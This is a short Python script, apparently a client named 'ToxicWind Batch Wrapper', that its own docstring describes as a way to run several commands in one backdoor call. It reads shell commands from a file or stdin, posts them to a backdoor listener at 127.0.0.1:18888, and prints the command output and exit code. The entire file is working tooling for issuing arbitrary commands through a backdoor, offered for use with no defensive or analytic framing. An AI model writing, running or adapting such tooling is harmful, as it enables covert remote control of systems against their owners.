#!/usr/bin/env python3
"""
ToxicWind Batch Wrapper (tw-batch) — Run multiple commands in one backdoor call
Usage: tw-batch <script_file>
       echo "cmd1; cmd2; cmd3" | tw-batch -
"""

import sys, json, urllib.request

ENVD_ALT = "http://127.0.0.1:18888"

def call(cmd):
    req = urllib.request.Request(
        ENVD_ALT,
        data=json.dumps({"cmd": cmd}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=300) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"error": str(e), "stdout": "", "stderr": "", "rc": -1}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: tw-batch <file> or echo cmds | tw-batch -")
        sys.exit(1)
    
    if sys.argv[1] == "-":
        script = sys.stdin.read()
    else:
        with open(sys.argv[1]) as f:
            script = f.read()
    
    result = call(script)
    if result.get("stdout"):
        print(result["stdout"], end="")
    if result.get("stderr"):
        print(result["stderr"], end="", file=sys.stderr)
    sys.exit(result.get("rc", 0))
